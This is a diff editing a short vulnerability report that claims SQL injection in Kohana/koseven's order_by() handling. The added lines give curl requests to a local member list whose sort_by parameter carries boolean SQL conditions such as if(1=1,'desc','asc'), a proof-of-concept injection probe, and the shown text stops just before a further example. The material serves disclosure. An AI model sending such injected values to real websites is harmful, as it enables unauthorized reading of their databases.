@@ -1,9 +1,12 @@
 Kohana/koseven allows SQL Injection via the order_by() parameter. 
    
    
-In some website, developers use dynamic sort operation like this   
+In some website, developers use dynamic sort operation like Member.php   
+then all of the three lines of code can work
 ```
-http://x.com?order_by=desc
+curl http://127.0.0.1/member/list?sort_by=desc
+curl http://127.0.0.1/member/list?sort_by=if(1=1,'desc','asc')
+curl http://127.0.0.1/member/list?sort_by=if(1=2,'desc','asc')
 ```   
 attacker can execute SQL like:
 ```
